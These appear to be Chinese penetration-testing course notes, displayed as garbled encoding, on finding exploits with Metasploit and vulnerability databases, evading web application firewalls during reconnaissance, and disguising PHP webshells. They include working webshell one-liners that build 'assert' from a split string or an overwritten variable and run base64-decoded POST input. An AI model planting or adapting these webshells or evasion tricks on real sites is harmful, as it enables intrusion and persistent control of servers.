<h1 id="ç¬¬75å¤©-æ¼æ´åˆ©ç”¨-MSFæ¡†æ¶-CVE-CNVD-POC-EXPç›‘æ§-æŸ¥æ‰¾-æ•´ç†"><a href="#ç¬¬75å¤©-æ¼æ´åˆ©ç”¨-MSFæ¡†æ¶-CVE-CNVD-POC-EXPç›‘æ§-æŸ¥æ‰¾-æ•´ç†" class="headerlink" title="ç¬¬75å¤© æ¼æ´åˆ©ç”¨-MSFæ¡†æ¶&amp;CVE&amp;CNVD&amp;POC&amp;EXPç›‘æ§&amp;æŸ¥æ‰¾&amp;æ•´ç†"></a>ç¬¬75å¤© æ¼æ´åˆ©ç”¨-MSFæ¡†æ¶&amp;CVE&amp;CNVD&amp;POC&amp;EXPç›‘æ§&amp;æŸ¥æ‰¾&amp;æ•´ç†</h1><h4 id="çŸ¥è¯†ç‚¹ï¼š-51"><a href="#çŸ¥è¯†ç‚¹ï¼š-51" class="headerlink" title="çŸ¥è¯†ç‚¹ï¼š"></a>çŸ¥è¯†ç‚¹ï¼š</h4><p>1ã€MSF-æ¼æ´åˆ©ç”¨æ¡†æ¶ä½¿ç”¨<br>2ã€åº“æŸ¥æ‰¾CVE&amp;CNVD&amp;å…³é”®å­—<br>3ã€åº“æ•´ç†-CVE&amp;CNVDæ¼æ´è¯¦æƒ…<br>4ã€æ–°æ¼æ´-æ¡†æ¶æˆ–å…¶ä»–æœªé›†æˆåˆ©ç”¨<br>é›†æˆå’Œæœªé›†æˆæ¼æ´çš„åˆ©ç”¨æ€è·¯ï¼Œæ¼æ´åˆ©ç”¨æ¡ä»¶ç­‰ã€‚</p>
<p>æ¼æ´å‘ç°åï¼Œä¸€èˆ¬ä¼šæœ‰é‚£äº›å…³äºæ¼æ´çš„å¸¸è§è¯´æ˜ä¿¡æ¯ï¼š<br>1ã€æ¼æ´å¯¹è±¡<br>2ã€æ¼æ´ç¼–å·<br>3ã€æ¼æ´ç±»å‹</p>
<h4 id="æ¼æ´èµ„æºï¼š"><a href="#æ¼æ´èµ„æºï¼š" class="headerlink" title="æ¼æ´èµ„æºï¼š"></a>æ¼æ´èµ„æºï¼š</h4><p>today-cve<br><a href="https://cassandra.cerias.purdue.edu/CVE_changes/today.html">https://cassandra.cerias.purdue.edu/CVE_changes/today.html</a><br>cveå®˜ç½‘<br><a href="https://cve.mitre.org/">https://cve.mitre.org/</a><br>å›½å®¶ä¿¡æ¯å®‰å…¨æ¼æ´å…±äº«å¹³å°<br><a href="https://www.cnvd.org.cn/">https://www.cnvd.org.cn/</a><br>å›½å®¶ä¿¡æ¯å®‰å…¨æ¼æ´åº“<br><a href="http://www.cnnvd.org.cn/">http://www.cnnvd.org.cn/</a></p>
<h4 id="æ¼”ç¤ºæ¡ˆä¾‹ï¼š-45"><a href="#æ¼”ç¤ºæ¡ˆä¾‹ï¼š-45" class="headerlink" title="æ¼”ç¤ºæ¡ˆä¾‹ï¼š"></a>æ¼”ç¤ºæ¡ˆä¾‹ï¼š</h4><p>æ¼æ´åˆ©ç”¨æ•´ç†åº“-PocOrExp&amp;CVE-CNVD<br>æ¼æ´åˆ©ç”¨-æŸ¥æ‰¾åº“-SearchSploit&amp;PoC-in-GitHub<br>æ¼æ´åˆ©ç”¨-æ¨¡å—æ¡†æ¶-MetaSploit-.Framework(MSF)<br>æ¼æ´åˆ©ç”¨-æ‚ä¹±å·¥å…·-ç‰¹å®šå›¾åƒåŒ–æ¸—é€æ­¦å™¨åº“(6.1)</p>
<p>æ¼åŒåˆ©ç”¨-æ•´ç†åº“-PocOrExp&amp;CVE-CNVD<br><a href="https://github.com/ttonys/Scrapy-CVE-CNVD">https://github.com/ttonys/Scrapy-CVE-CNVD</a><br><a href="https://github.com/ycdxsb/PocOrExp">https://github.com/ycdxsb/PocOrExp</a> in Github</p>
<p>æ¼åŒåˆ©ç”¨-æŸ¥æ‰¾åº“-SearchSploit&amp;PoC-in-GitHub<br><a href="https://github.com/nomi-sec/PoC-in-GitHub">https://github.com/nomi-sec/PoC-in-GitHub</a><br><a href="https://github.com/offensive-security/exploitdb">https://github.com/offensive-security/exploitdb</a></p>
<p>æ¼æ´åˆ©ç”¨-æ¨¡å—æ¡†æ¶-MetaSploit-Framework(MSF)</p>
<blockquote>
<p>åˆ©ç”¨æŸ¥æ‰¾ï¼š</p>
<p>åŸºäºä¸‰ä¸ªä¿¡æ¯ï¼š</p>
<p>1ã€æ¼æ´ä¿¡æ¯</p>
<p>2ã€æ¼æ´ç¼–å·</p>
<p>3ã€æ¼æ´å¯¹è±¡</p>
<p>åˆ©ç”¨æ¼æ´ï¼š<br>MSFæ¼æ´åˆ©ç”¨æ¡†æ¶</p>
<p>é›†æˆå¤§éƒ¨åˆ†çš„å®‰å…¨æ¼æ´åˆ©ç”¨æ¨¡å—ï¼Œç›´æ¥åˆ©ç”¨MSFå¯¹æ¼æ´è¿›è¡Œåˆ©ç”¨</p>
<p>ä½†æ˜¯ä¸ä»£è¡¨æ‰€æœ‰æ¼æ´éƒ½æœ‰é›†æˆï¼Œæ¼æ´ç±»å‹æˆ–æ¼æ´å½±å“ç­‰åŸå› é€ æˆæœªé›†æˆ</p>
<p>1ã€æœ€æ–°æ¼æ´</p>
<p>2ã€æ¼æ´å¤ç°å¤æ‚</p>
<p>3ã€æ¼æ´å½±å“è¿‡å°</p>
</blockquote>
<p><a href="https://www.metasploit.com/">https://www.metasploit.com/</a><br>å®‰è£…ä¸‹è½½<br><a href="https://docs.metasploit.com/docs/using-metasploit/getting-started/nightly-installers.html">https://docs.metasploit.com/docs/using-metasploit/getting-started/nightly-installers.html</a><br>ç®€å•ä½¿ç”¨ï¼š<br><a href="https://blog.csdn.net/weixin_42380348/article/details/123549631">https://blog.csdn.net/weixin_42380348/article/details/123549631</a></p>
<p>æ¼åŒåˆ©ç”¨-æ‚å‘¨å·¥å…·ç‰¹å®šå›¾åƒåŒ–æ¸—é€æ­¦å™¨åº“(V6.1)<br><a href="https://mp.weixin.qq.com/s/Ha1R17KH-vssbr8cmYwl4Q">https://mp.weixin.qq.com/s/Ha1R17KH-vssbr8cmYwl4Q</a></p>
<h1 id="ç¬¬76å¤©-WAFæ”»é˜²-ä¿¡æ¯æ”¶é›†-è¯†åˆ«-è¢«åŠ¨æ¢é’ˆ-ä»£ç†æ± -ä»¿æŒ‡çº¹-ç™½åå•"><a href="#ç¬¬76å¤©-WAFæ”»é˜²-ä¿¡æ¯æ”¶é›†-è¯†åˆ«-è¢«åŠ¨æ¢é’ˆ-ä»£ç†æ± -ä»¿æŒ‡çº¹-ç™½åå•" class="headerlink" title="ç¬¬76å¤© WAFæ”»é˜²-ä¿¡æ¯æ”¶é›†&amp;è¯†åˆ«&amp;è¢«åŠ¨æ¢é’ˆ&amp;ä»£ç†æ± &amp;ä»¿æŒ‡çº¹&amp;ç™½åå•"></a>ç¬¬76å¤© WAFæ”»é˜²-ä¿¡æ¯æ”¶é›†&amp;è¯†åˆ«&amp;è¢«åŠ¨æ¢é’ˆ&amp;ä»£ç†æ± &amp;ä»¿æŒ‡çº¹&amp;ç™½åå•</h1><h3 id="çŸ¥è¯†ç‚¹ï¼š-52"><a href="#çŸ¥è¯†ç‚¹ï¼š-52" class="headerlink" title="çŸ¥è¯†ç‚¹ï¼š"></a>çŸ¥è¯†ç‚¹ï¼š</h3><p>1ã€WAFä»‹ç»&amp;æ¨¡å¼&amp;è¯†åˆ«&amp;é˜²æŠ¤ç­‰<br>2ã€ä¿¡æ¯æ”¶é›†è¢«åŠ¨æ‰«æ&amp;ç¬¬ä¸‰æ–¹æ¥å£<br>3ã€ä¿¡æ¯æ”¶é›†åŸºäº<a href="https://so.csdn.net/so/search?q=%E7%88%AC%E8%99%AB&spm=1001.2101.3001.7020">çˆ¬è™«</a>&amp;æ–‡ä»¶ç›®å½•æ¢é’ˆ<br>4ã€ä¿¡æ¯æ”¶é›†åŸºäºç”¨æˆ·&amp;ä»£ç†æ± &amp;ç™½åå•</p>
<h4 id="ç« èŠ‚ç‚¹ï¼š-6"><a href="#ç« èŠ‚ç‚¹ï¼š-6" class="headerlink" title="ç« èŠ‚ç‚¹ï¼š"></a>ç« èŠ‚ç‚¹ï¼š</h4><p>WFç»•è¿‡ä¸»è¦é›†ä¸­åœ¨ä¿¡æ¯æ”¶é›†ï¼Œæ¼æ´å‘ç°ï¼Œæ¼æ´åˆ©ç”¨ï¼Œæƒé™æ§åˆ¶å››ä¸ªé˜¶æ®µï¼Œ</p>
<p>è¡¥å……ç‚¹ï¼š<br>1ã€ä»€ä¹ˆæ˜¯WAF?<br>Web Application Firewall(webåº”ç”¨é˜²ç«å¢™)ï¼Œä¸€ç§å…¬è®¤çš„è¯´æ³•æ˜¯webåº”ç”¨é˜²ç«å¢™é€šè¿‡æ‰§<br>è¡Œä¸€ç³»åˆ—é’ˆå¯¹HTTP&#x2F;HTTPSçš„å®‰å…¨ç­–è·¯æ¥ä¸“é—¨ä¸ºwebåº”ç”¨æä¾›ä¿æŠ¤çš„ä¸€æ¬¾äº§å“ã€‚<br>åŸºæœ¬å¯ä»¥åˆ†ä¸ºä»¥ä¸‹4ç§<br>è½¯ä»¶å‹WAF<br>ä»¥è½¯ä»¶çš„å½¢å¼å®‰è£…åœ¨æœåŠ¡å™¨ä¸Šé¢ï¼Œå¯ä»¥æ¥è§¦åˆ°æœåŠ¡å™¨ä¸Šçš„æ–‡ä»¶ï¼Œå› æ­¤å°±å¯ä»¥æ£€æœåŠ¡å™¨ä¸Š<br>æ˜¯å¦æœ‰webshell,æ˜¯å¦æœ‰æ–‡ä»¶è¢«åˆ›å»ºç­‰ã€‚<br>ç¡¬ä»¶å‹WAF<br>ä»¥ç¡¬ä»¶å½¢å¼éƒ¨ç½²åœ¨é“¾è·¯ä¸­ï¼Œæ”¯æŒå¤šç§éƒ¨æš‘æ–¹å¼ã€‚å½“ä¸²è”åˆ°é“¾è·¯ä¸Šæ—¶å¯ä»¥æ‹¦æˆªæ¶æ„æµé‡ï¼Œåœ¨<br>æ—è·¯ç›‘å¬æ¨¡å¼æ—¶åªè®°å½•æ”»å‡»ä½†æ˜¯ä¸è¿›è¡Œæ‹¦æˆªï¼Œ<br>äº‘WAF<br>ä¸€èˆ¬ä»¥åå‘ä»£ç†çš„å½¢å¼å·¥ä½œï¼Œé€šè¿‡é…ç½®åï¼Œä½¿å¯¹ç½‘è´´çš„è¯·æ±‚æ•°æ®ä¼˜å…ˆç»è¿‡WAFä¸»æœºï¼Œåœ¨<br>WAFä¸»æœºå¯¹æ•°æ®è¿›è¡Œè¿‡æ»¤åå†ä¼ ç»™æœåŠ¡å™¨<br>ç½‘ç«™å†…ç½®çš„WAF<br>å°±æ˜¯æ¥è‡ªç½‘ç«™å†…éƒ¨çš„è¿‡æ»¤ï¼Œç›´æ¥å‡ºç°åœ¨ç½‘ç«™ä»£ç ä¸­ï¼Œæ¯”å¦‚è¯´å¯¹è¾“å…¥çš„å‚æ•°å¼ºåˆ¶ç±»è½¬æ¢å•Šï¼Œ<br>å¯¹è¾“å…¥çš„å‚æ•°è¿›è¡Œæ•™æ„Ÿè¯æ£€æ±‰åˆ™é˜¿ ä»€ä¹ˆçš„</p>
<h4 id="æ¼”ç¤ºæ¡ˆä¾‹ï¼š-46"><a href="#æ¼”ç¤ºæ¡ˆä¾‹ï¼š-46" class="headerlink" title="æ¼”ç¤ºæ¡ˆä¾‹ï¼š"></a>æ¼”ç¤ºæ¡ˆä¾‹ï¼š</h4><p>ä¿¡æ¯æ”¶é›†è¢«åŠ¨æ‰«æé»‘æš—æ“&amp;ä¸‰æ–¹æ¥å£<br>ä¿¡æ¯æ”¶é›†ç›®å½•æ‰«æ-Pythonä»£ç†åŠ è½½è„šæœ¬<br>ä¿¡æ¯æ”¶é›†-å·¥å…·æ‰«æ-Awvs&amp;Xray&amp;Gobyå†…ç½®</p>
<p>ä¿¡æ¯æ”¶é›†å¸¸è§æ£€æµ‹ï¼š<br>1ã€è„šæœ¬æˆ–å·¥å…·é€Ÿåº¦æµé‡å¿«<br>2ã€è„šæœ¬æˆ–å·¥å…·çš„æŒ‡çº¹è¢«è¯†åˆ«<br>3ã€è„šæœ¬æˆ–å·¥å…·çš„æ£€æµ‹Payload</p>
<p>ä¿¡æ¯æ”¶é›†å¸¸è§æ–¹æ³•ï¼š<br>1ã€å»¶è¿Ÿï¼šè§£å†³è¯·æ±‚è¿‡å¿«å°IPçš„æƒ…å†µ<br>2ã€ä»£ç†æ± ï¼šåœ¨ç¡®ä¿é€Ÿåº¦çš„æƒ…å†µä¸‹è§£å†³è¯·æ±‚è¿‡å¿«å°Pçš„æ‹¦æˆª<br>3ã€ç™½åå•ï¼šæ¨¡æ‹Ÿç™½åå•æ¨¡æ‹ŸWAFæˆæƒæµ‹è¯•ï¼Œè§£å†³é€Ÿåº¦åŠæµ‹è¯•æ‹¦æˆª<br>4ã€æ¨¡æ‹Ÿç”¨æˆ·ï¼šæ¨¡æ‹ŸçœŸå®ç”¨æˆ·æ•°æ®åŒ…è¯·æ±‚æ¢é’ˆï¼Œè§£å†³WAFæŒ‡çº¹è¯†åˆ«</p>
<p>å»¶è¿Ÿè®¾ç½®æ‰«æé—´éš”</p>
<p>ä»£ç†æ± ä½¿ç”¨proxifierä»£ç†</p>
<p>æ¡ˆä¾‹ï¼šå®‰å…¨ç‹—å­˜åœ¨UAç™½åå•ï¼Œå³è®¾ç½®ä¸ºç™¾åº¦æˆ–360çˆ¬è™«çš„UAå¤´æœ‰æ¦‚ç‡ç»•è¿‡å°ç¦</p>
<p>ä¿¡æ¯æ”¶é›†è¢«åŠ¨æ‰«æé»‘æš—å¼±å¼•æ“&amp;ä¸‰æ–¹æ¥å£<br>é»‘æš—å¼•æ“ï¼šFofa Quake Shodan zoomeye0.zoneç­‰<br>å…¶ä»–æ¥å£ï¼šhtps:&#x2F;forum.ywhack.com&#x2F;bountytips.php?getinfo</p>
<p>ä¿¡æ¯æ”¶é›†ç›®å½•æ‰«æPythonä»£ç†åŠ è½½è„šæœ¬<br>import requests<br>import time</p>
<p>xrayè®¾ç½®ä»£ç† ä¿®æ”¹é…ç½®æ–‡ä»¶ æˆ–è€…ä½¿ç”¨proxifierä»£ç†è½¯ä»¶</p>
<p>gobyè®¾ç½®ä»£ç†</p>
<h1 id="ç¬¬ä¸ƒåä¸ƒå¤©WAFæ”»é˜²-æƒé™æ§åˆ¶-ä»£ç å…æ€-å¼‚æˆ–è¿ç®—-å˜é‡è¦†ç›–-æ··æ·†åŠ å¯†-ä¼ å‚"><a href="#ç¬¬ä¸ƒåä¸ƒå¤©WAFæ”»é˜²-æƒé™æ§åˆ¶-ä»£ç å…æ€-å¼‚æˆ–è¿ç®—-å˜é‡è¦†ç›–-æ··æ·†åŠ å¯†-ä¼ å‚" class="headerlink" title="ç¬¬ä¸ƒåä¸ƒå¤©WAFæ”»é˜²-æƒé™æ§åˆ¶&amp;ä»£ç å…æ€&amp;å¼‚æˆ–è¿ç®—&amp;å˜é‡è¦†ç›–&amp;æ··æ·†åŠ å¯†&amp;ä¼ å‚"></a>ç¬¬ä¸ƒåä¸ƒå¤©WAFæ”»é˜²-æƒé™æ§åˆ¶&amp;ä»£ç å…æ€&amp;å¼‚æˆ–è¿ç®—&amp;å˜é‡è¦†ç›–&amp;æ··æ·†åŠ å¯†&amp;ä¼ å‚</h1><h4 id="çŸ¥è¯†ç‚¹ï¼š-53"><a href="#çŸ¥è¯†ç‚¹ï¼š-53" class="headerlink" title="çŸ¥è¯†ç‚¹ï¼š"></a>çŸ¥è¯†ç‚¹ï¼š</h4><p>1ã€è„šæœ¬åé—¨åŸºç¡€&amp;åŸç†<br>2ã€è„šæœ¬åé—¨æŸ¥æ€ç»•è¿‡æœºåˆ¶<br>3ã€æƒé™ç»´æŒè¦†ç›–&amp;ä¼ å‚&amp;åŠ å¯†&amp;å¼‚æˆ–ç­‰<br>ä»£ç å—&amp;ä¼ å‚æ•°æ®&amp;å·¥å…·æŒ‡çº¹ç­‰(è¡¨é¢&amp;è¡Œä¸º)<br>1ã€ä»£ç è¡¨é¢å±‚å…æ€-ASP&amp;PHP&amp;JSP&amp;ASPXç­‰<br>2ã€å·¥å…·è¡Œä¸ºå±‚å…æ€èœåˆ€&amp;èšå‰‘&amp;å†°è&amp;å“¥æ–¯æ‹‰ç­‰</p>
<h4 id="ç« èŠ‚ç‚¹ï¼š-7"><a href="#ç« èŠ‚ç‚¹ï¼š-7" class="headerlink" title="ç« èŠ‚ç‚¹ï¼š"></a>ç« èŠ‚ç‚¹ï¼š</h4><p>WAFç»•è¿‡ä¸»è¦é›†ä¸­åœ¨ä¿¡æ¯æ”¶é›†ï¼Œæ¼æ´å‘ç°ï¼Œæ¼æ´åˆ©ç”¨ï¼Œæƒé™æ§åˆ¶å››ä¸ªé˜¶æ®µ</p>
<h4 id="è¡¥å……ç‚¹ï¼š"><a href="#è¡¥å……ç‚¹ï¼š" class="headerlink" title="è¡¥å……ç‚¹ï¼š"></a>è¡¥å……ç‚¹ï¼š</h4><p>1ã€ä»€ä¹ˆæ˜¯WAF?<br>Veb Application Firewall(webåº”ç”¨é˜²ç«å¢™)ï¼Œä¸€ç§å…¬è®¤çš„è¯´æ³•æ˜¯â€webåº”ç”¨é˜²ç«å¢™é€šè¿‡æ‰§<br>è¡Œä¸€ç³»åˆ—é’ˆå¯¹HTTP&#x2F;HTTPSçš„å®‰å…¨ç­–è·¯æ¥ä¸“é—¨ä¸ºwbåº”ç”¨æä¾›ä¿æŠ¤çš„ä¸€æ¬¾äº§å“ã€‚<br>åŸºæœ¬å¯ä»¥åˆ†ä¸ºä»¥ä¸‹4ç§<br>è½¯ä»¶å‹WAF<br>ä»¥è½¯ä»¶çš„å½¢å¼å®‰è£…åœ¨æœåŠ¡å™¨ä¸Šé¢ï¼Œå¯ä»¥æ¥è§¦åˆ°æœåŠ¡å™¨ä¸Šçš„æ–‡ä»¶ï¼Œå› æ­¤å°±å¯ä»¥æ£€æµ‹æœåŠ¡å™¨ä¸Š<br>æ˜¯å¦æœ‰webshell,æ˜¯å¦æœ‰æ–‡ä»¶è¢«åˆ›å»ºç­‰ã€‚<br>ç¡¬ä»¶å‹WAF<br>ä»¥ç¡¬ä»¶å½¢å¼éƒ¨ç½²åœ¨é“¾è·¯ä¸­ï¼Œæ”¯æŒå¤šç§éƒ¨æš‘æ–¹å¼ã€‚å½“ä¸²è”åˆ°é“¾è·¯ä¸Šæ—¶å¯ä»¥æ‹¦æˆªæ¶æ„æµé‡ï¼Œåœ¨<br>æ—è·¯ç›‘å¬æ¨¡å¼æ—¶åªè®°å½•æ”»å‡»ä½†æ˜¯ä¸è¿›è¡Œæ‹¦æˆªã€‚<br>äº‘WAF<br>ä¸€è‚¡ä»¥åå‘ä»£ç†çš„å½¢å¼å·¥ä½œï¼Œé€šè¿‡é…ç½®åï¼Œä½¿å¯¹ç½‘ç«™çš„è¯·æ±‚æ•°æ®ä¼˜å…ˆç»è¿‡WAFä¸»æœºï¼Œåœ¨<br>WAFä¸»æœºå¯¹æ•°æ®è¿›è¡Œè¿‡æ»¤åå†ä¼ ç»™æœåŠ¡å™¨<br>ç½‘ç«™å†…ç½®çš„WAF<br>å°±æ˜¯æ¥è‡ªç½‘ç«™å†…éƒ¨çš„è¿‡æ»¤ï¼Œç›´æ¥å‡ºç°åœ¨ç½‘ç«™ä»£ç ä¸­ï¼Œæ¯”å¦‚è¯´å¯¹è¾“å…¥çš„å‚æ•°å¼ºåˆ¶ç±»è½¬æ¢å•Šï¼Œ<br>å¯¹è¾“å…¥çš„å‚æ•°è¿›è¡Œæ•æ„Ÿè¯æ£€æµ‹æµ‹å•Šä»€ä¹ˆçš„</p>
<h4 id="æ¼”ç¤ºæ¡ˆä¾‹ï¼š-47"><a href="#æ¼”ç¤ºæ¡ˆä¾‹ï¼š-47" class="headerlink" title="æ¼”ç¤ºæ¡ˆä¾‹ï¼š"></a>æ¼”ç¤ºæ¡ˆä¾‹ï¼š</h4><p>åŸºç¡€-è„šæœ¬åé—¨æ§åˆ¶åŸç†ä»£ç è§£é‡Š<br>åŸç†-è„šæœ¬åé—¨æŸ¥æ€æœºåˆ¶-å‡½æ•°&amp;è¡Œä¸º<br>ä»£ç -è„šæœ¬åé—¨å…æ€å˜å¼‚-è¦†ç›–&amp;ä¼ å‚<br>ä»£ç -è„šæœ¬åé—¨å…æ€å˜å¼‚-å¼‚æˆ–&amp;åŠ å¯†<br>æ‹“å±•è„šæœ¬åé—¨è„šæœ¬ç±»å‹-JSP&amp;ASPX</p>
<p>åŸºç¡€è„šæœ¬åé—¨æ§åˆ¶åŸç†ä»£ç è§£é‡Š<br>å¯¹æ¯”å·¥å…·ä»£ç èœåˆ€&amp;èšå‰‘&amp;å†°è&amp;å“¥æ–¯æ‹‰ç­‰</p>
<p>åŸç†è„šæœ¬åé—¨æŸ¥æ€æœºåˆ¶å‡½æ•°&amp;è¡Œä¸º<br>å¯¹æ¯”WAFè§„åˆ™æ•°åŒ¹é…&amp;å·¥å…·æŒ‡çº¹ç­‰</p>
<p>ä»£ç è„šæœ¬åé—¨å…æ€å˜å¼‚å¤ç›–&amp;ä¼ å‚<br>1.phpä¼ å‚å¸¦å…¥</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line"><span class="variable">$aa</span>=<span class="variable">$a</span>.<span class="string">&#x27;ert&#x27;</span>;</span><br><span class="line"><span class="variable">$aa</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;X&#x27;</span>])):</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">?a=ass</span><br><span class="line">x=cGhwaW5mbygpOw==</span><br></pre></td></tr></table></figure>

<p>2.phpå˜é‡è¦†ç›–</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=<span class="string">&#x27;b&#x27;</span>;</span><br><span class="line"><span class="variable">$b</span>=<span class="string">&#x27;assert&#x27;</span>;</span><br><span class="line"><span class="variable">$$a</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;x&#x27;</span>]));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>x&#x3D;cGhwaw5mbygpow&#x3D;&#x3D;</p>
<p>#ä»£ç è„šæœ¬åé—¨å…”æ€å˜å¼‚å¼‚æˆ–&amp;åŠ å¯†<br>3.phpåŠ å¯†å˜å¼‚<br><a href="http://www.phpjm.net/">http://www.phpjm.net</a><br><a href="https://www.phpjms.com/">https://www.phpjms.com/</a><br><a href="http://1.15.155.76.1234/">http://1.15.155.76.1234/</a><br>æ€è·¯ï¼šå°†webshellåŠ å¯†ï¼Œä¸Šä¼ è¿‡ç¨‹ä¸­åˆ™ä¸ä¼šè¢«æ£€æµ‹å‡ºï¼Œç„¶åä¼ å‚æ—¶ä½¿ç”¨å‚æ•°åŠ å¯†ç»•è¿‡å‚æ•°æ£€æµ‹</p>
<p>4.phpå¼‚æˆ–è¿ç®— æ— å­—ç¬¦webshell<br>import requests<br>import time<br>import threading.queue</p>
<p>æ‹“å±•å³æœ¬åé—¨è„šæœ¬ç±»å‹JSP&amp;ASPX</p>
<p>5.phpè„šæœ¬ç”Ÿæˆå™¨<br>Webshell-venom<br>ASP PHP JSP ASPX</p>
<h1 id="ç¬¬78å¤©-WAFæ”»é˜²-èšåˆ€-å†°è-å“¥æ–¯æ‹‰-æµé‡é€šè®¯-ç‰¹å¾ç»•è¿‡-æ£€æµ‹ååˆ¶-æ„ŸçŸ¥"><a href="#ç¬¬78å¤©-WAFæ”»é˜²-èšåˆ€-å†°è-å“¥æ–¯æ‹‰-æµé‡é€šè®¯-ç‰¹å¾ç»•è¿‡-æ£€æµ‹ååˆ¶-æ„ŸçŸ¥" class="headerlink" title="ç¬¬78å¤© WAFæ”»é˜²-èšåˆ€&amp;å†°è&amp;å“¥æ–¯æ‹‰&amp;æµé‡é€šè®¯&amp;ç‰¹å¾ç»•è¿‡&amp;æ£€æµ‹ååˆ¶&amp;æ„ŸçŸ¥"></a>ç¬¬78å¤© WAFæ”»é˜²-èšåˆ€&amp;å†°è&amp;å“¥æ–¯æ‹‰&amp;æµé‡é€šè®¯&amp;ç‰¹å¾ç»•è¿‡&amp;æ£€æµ‹ååˆ¶&amp;æ„ŸçŸ¥</h1><h4 id="çŸ¥è¯†ç‚¹ï¼š-54"><a href="#çŸ¥è¯†ç‚¹ï¼š-54" class="headerlink" title="çŸ¥è¯†ç‚¹ï¼š"></a>çŸ¥è¯†ç‚¹ï¼š</h4><p>1ã€èœåˆ€-æµé‡&amp;é€šè®¯&amp;æ£€æµ‹8ç»•è¿‡<br>2ã€å†°ç«­-æµé‡&amp;é€šè®¡8æ£€æµ‹&amp;ç»•è¿‡<br>3ã€å“¥æ–¯æ‹‰-æµé‡&amp;é€šè®¯&amp;æ£€æµ‹&amp;ç»•è¿‡<br>ä»£ç å—&amp;ä¼ å‚æ•°æ®&amp;å·¥å…·æŒ‡çº¹ç­‰è¡¨é¢&amp;è¡Œä¸ºï¼‰<br>1ã€ä»£ç è¡¨é¢å±‚å…æ€-ASP&amp;PHP&amp;JSP&amp;ASPXç­‰<br>2ã€å·¥å…·è¡Œä¸ºå±‚å…æ€èœåˆ€&amp;èšå‰‘&amp;å†°è&amp;å“¥æ–¯æ‹‰ç­‰</p>
<h4 id="ç« èŠ‚ç‚¹ï¼š-8"><a href="#ç« èŠ‚ç‚¹ï¼š-8" class="headerlink" title="ç« èŠ‚ç‚¹ï¼š"></a>ç« èŠ‚ç‚¹ï¼š</h4><p>WAFç»•è¿‡ä¸»è¦é›†ä¸­åœ¨ä¿¡æ¯æ”¶é›†ï¼Œæ¼æ´å‘ç°ï¼Œæ¼æ´åˆ©ç”¨ï¼Œæƒé™æ§åˆ¶å››ä¸ªé˜¶æ®µã€‚</p>
<p>å¯ä»¥åˆ†ä¸ºä¸‹é¢ä¸‰ç§æ£€æµ‹çš„ï¼Œå³WAFã€å…¥ä¾µæ£€æµ‹å¹³å°ã€å¨èƒæ„ŸçŸ¥å¹³å°ã€‚æ£€æµ‹çš„æŠ€æœ¯å¯ä»¥åˆ†ä¸ºæ­£åˆ™åŒ¹é…ã€æœºå™¨è¯­è¨€ã€è¡Œä¸ºåˆ†æã€‚ä¸€èˆ¬é‚£ç§å¼€æºçš„å°±æ˜¯ç”¨çš„æ­£åˆ™åŒ¹é…ï¼Œæˆ–è€…è¯´ä¸€äº›æ¯”è¾ƒåƒåœ¾çš„é¡¹ç›®ï¼Œå› ä¸ºç”¨æ­£åˆ™åŒ¹é…çš„è¯æ¯”è¾ƒå®¹æ˜“ç»•è¿‡ï¼Œä½¿ç”¨åŠ å¯†ã€ç¼–ç ã€åˆ†æ®µç­‰æ“ä½œå³å¯ç»•è¿‡ã€‚è¿™ä¸ªåˆ†æ®µå°±æ˜¯æŠŠä¸€äº›ç‰¹å¾æµé‡åˆ†æ®µå‘é€ï¼Œæ¯”å¦‚ä»–æ£€æµ‹POSTè¿™ä¸ªä¸œè¥¿ï¼Œä½ å¯ä»¥ä¸­é—´åŠ ç‚¹ï¼Œç„¶ååˆ†æˆå‡ ä¸ªå»è¡¨ç¤ºã€‚è€Œè¡Œä¸ºåˆ†æåˆ™ä¸çœ‹ä½ è¿‡æ»¤çš„å‡½æ•°ï¼Œè€Œæ˜¯çœ‹è¿™ä¸ªä»£ç çš„æœ€ç»ˆè¡Œä¸ºæ˜¯ä»€ä¹ˆï¼Œç„¶åè¿›è¡Œåˆ†æï¼Œå¦‚æœè¿‡æ¢æµ‹åˆ°è¡Œä¸ºæ¯”è¾ƒå±é™©å°±ä¼šæ‹¦æˆªï¼Œè€Œè¿™ä¸ªæœºå™¨è¯­è¨€ä¹Ÿæ˜¯æ¯”è¾ƒé«˜çº§çš„ä¸œè¥¿ï¼Œå°è¿ªä¹Ÿæ²¡è§£é‡Šæ¸…ã€‚ä¸€èˆ¬å•†ä¸šçš„éƒ½æ˜¯è¡Œä¸ºåˆ†æå’Œæœºå™¨è¯­è¨€å»æ£€æµ‹ï¼Œå¼€æºçš„æ˜¯æ­£åˆ™ã€‚æœ€ç»ˆçš„å‘å±•æ–¹å‘å‘¢ä¹Ÿæ˜¯å¾€æœºå™¨è¯­è¨€å’Œè¡Œä¸ºåˆ†æå‘å±•ã€‚</p>
<blockquote>
<p>æ­£åˆ™è¡¨è¾¾å¼æ˜¯ WAF ä¸­æœ€å¸¸ç”¨çš„æŠ€æœ¯ä¹‹ä¸€ï¼Œå¯ç”¨äºå®ç°åŸºäºæ¨¡å¼åŒ¹é…çš„è§„åˆ™å’Œç­–ç•¥ã€‚</p>
<p>æœºå™¨è¯­è¨€æ˜¯è®¡ç®—æœºèƒ½å¤Ÿç†è§£å’Œæ‰§è¡Œçš„æŒ‡ä»¤é›†ï¼Œä¸é«˜çº§ç¼–ç¨‹è¯­è¨€ä¸åŒï¼Œå®ƒä½¿ç”¨äºŒè¿›åˆ¶ä»£ç æ¥è¡¨ç¤ºæ“ä½œå’Œæ•°æ®ã€‚åœ¨ WAF<br>ä¸­ï¼Œæœºå™¨è¯­è¨€å¯èƒ½ç”¨äºå¤„ç†å’Œåˆ†æç½‘ç»œæµé‡ï¼Œä»¥åŠæ‰§è¡Œç‰¹å®šçš„å®‰å…¨ç­–ç•¥å’Œè¡Œä¸ºåˆ†æã€‚</p>
